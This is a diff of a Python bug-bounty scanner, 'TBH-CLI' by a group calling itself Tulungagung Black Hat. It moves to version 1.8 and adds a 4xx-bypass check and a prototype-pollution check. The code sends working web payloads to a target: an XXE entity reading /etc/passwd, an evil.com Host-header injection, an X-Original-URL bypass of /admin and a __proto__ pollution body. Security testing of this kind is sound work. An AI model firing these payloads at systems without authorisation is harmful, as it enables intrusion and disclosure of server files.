@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
-# TBH-CLI v1.7 - Bug Bounty 16 Tools
+# TBH-CLI v1.8 - Bug Bounty 18 Tools
 import socket, requests, argparse, sys, urllib.parse, re
 
 BANNER = """\033[91m╔════════════════════════════════════╗
-\033[91m║ \033[97mTBH-CLI v1.7 \033[91m- Bug Bounty 16 Tools  \033[91m║
+\033[91m║ \033[97mTBH-CLI v1.8 \033[91m- Bug Bounty 18 Tools  \033[91m║
 \033[91m║ \033[90mTulungagung Black Hat | uchil404 \033[91m║
 \033[91m╚════════════════════════════════════╝\033[0m"""
 
 def scan_headers(url):
     try:
-        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/1.7'})
+        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/1.8'})
         missing=[h for h in ['Content-Security-Policy','Strict-Transport-Security'] if h not in r.headers]
         if missing: print(f"  \033[93m[!] Missing: {missing}\033[0m")
         else: print(f"  \033[92m[✓] Headers OK\033[0m")
@@ -111,7 +111,7 @@ def scan_idor(url):
 def scan_xxe(url):
     payload="""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"""
     try:
-        r=requests.post(url,timeout=5,data=payload,headers={'Content-Type':'application/xml','User-Agent':'TBH-CLI/1.7'})
+        r=requests.post(url,timeout=5,data=payload,headers={'Content-Type':'application/xml','User-Agent':'TBH-CLI/1.8'})
         if "root:" in r.text: print(f"  \033[91m[!] XXE Potensi\033[0m")
         else: print(f"  \033[92m[✓] XXE tidak terdeteksi\033[0m")
     except: print(f"  \033[92m[✓] XXE tidak terdeteksi (no XML)\033[0m")
@@ -127,24 +127,43 @@ def scan_crlf(url):
 
 def scan_host(url):
     try:
-        r=requests.get(url,timeout=5,headers={'Host':'evil.com','User-Agent':'TBH-CLI/1.7'})
-        if "evil.com" in r.text.lower(): print(f"  \033[91m[!] Host Header Injection Potensi\033[0m")
+        r=requests.get(url,timeout=5,headers={'Host':'evil.com','User-Agent':'TBH-CLI/1.8'})
+        if "evil.com" in r.text.lower(): print(f"  \033[91m[!] Host Header Potensi\033[0m")
         else: print(f"  \033[92m[✓] Host Header tidak terdeteksi\033[0m")
     except: print(f"  [-] Host error")
 
 def scan_clickjack(url):
     try:
-        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/1.7'})
+        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/1.8'})
         xfo=r.headers.get('X-Frame-Options','')
         if not xfo: print(f"  \033[93m[!] Clickjacking: Missing X-Frame-Options -> Low\033[0m")
         else: print(f"  \033[92m[✓] X-Frame-Options: {xfo}\033[0m")
     except: print(f"  [-] Clickjack error")
 
+def scan_4xx(url):
+    # 4xx Bypass try with headers
+    try:
+        r=requests.get(f"{url.rstrip('/')}/admin",timeout=5,headers={'User-Agent':'TBH-CLI/1.8'})
+        if r.status_code==403:
+            r2=requests.get(f"{url.rstrip('/')}/admin",timeout=5,headers={'X-Original-URL':'/admin','User-Agent':'TBH-CLI/1.8'})
+            if r2.status_code==200: print(f"  \033[91m[!] 4xx Bypass Potensi via X-Original-URL\033[0m")
+            else: print(f"  \033[92m[✓] 4xx tidak bisa bypass [{r.status_code}]\033[0m")
+        else: print(f"  \033[90m[-] 4xx tidak 403, skip bypass\033[0m")
+    except: print(f"  [-] 4xx error")
+
+def scan_proto(url):
+    payload='{"__proto__":{"polluted":"yes"}}'
+    try:
+        r=requests.post(url,timeout=5,data=payload,headers={'Content-Type':'application/json','User-Agent':'TBH-CLI/1.8'})
+        if "polluted" in r.text.lower(): print(f"  \033[91m[!] Prototype Pollution Potensi\033[0m")
+        else: print(f"  \033[92m[✓] Prototype Pollution tidak terdeteksi\033[0m")
+    except: print(f"  \033[92m[✓] Prototype Pollution tidak terdeteksi\033[0m")
+
 def bugbounty_menu(url):
     domain=urllib.parse.urlparse(url if url.startswith("http") else "https://"+url).netloc
     try: ip=socket.gethostbyname(domain)
     except: print("[!] Cannot resolve"); return
-    print(f"\n\033[96m[*] Bug Bounty 16 Tools: {domain} ({ip})\033[0m")
+    print(f"\n\033[96m[*] Bug Bounty 18 Tools: {domain} ({ip})\033[0m")
     print("="*50)
     print("\033[93m[1] Headers\033[0m"); scan_headers(url)
     print("\033[93m[2] Ports\033[0m"); scan_ports(ip)
@@ -162,13 +181,15 @@ def bugbounty_menu(url):
     print("\033[93m[14] CRLF\033[0m"); scan_crlf(url)
     print("\033[93m[15] Host Header\033[0m"); scan_host(url)
     print("\033[93m[16] Clickjacking\033[0m"); scan_clickjack(url)
+    print("\033[93m[17] 4xx Bypass\033[0m"); scan_4xx(url)
+    print("\033[93m[18] Prototype Pollution\033[0m"); scan_proto(url)
     print("="*50)
-    print("\033[92m[✓] Bug Bounty CLI 16 Tools Selesai\033[0m")
+    print("\033[92m[✓] Bug Bounty CLI 18 Tools Selesai\033[0m")
 
 def menu():
     print(BANNER)
-    print("\033[96mBug Bounty System 16 Tools:\033[0m")
-    print(" 1. Scan All 16 Tools")
+    print("\033[96mBug Bounty System 18 Tools:\033[0m")
+    print(" 1. Scan All 18 Tools")
     print(" 2. Scan Cepat (Headers+Ports)")
     print(" 3. Bantuan")
     print(" 0. Keluar")
@@ -188,7 +209,7 @@ def menu():
         else: print("[!] Pilih 0/1/2/3")
 
 if __name__=="__main__":
-    parser=argparse.ArgumentParser(description="TBH-CLI 16 Tools", add_help=False)
+    parser=argparse.ArgumentParser(description="TBH-CLI 18 Tools", add_help=False)
     parser.add_argument("-u","--url",help="Target URL")
     parser.add_argument("-h","--help",action="store_true")
     args,_=parser.parse_known_args()
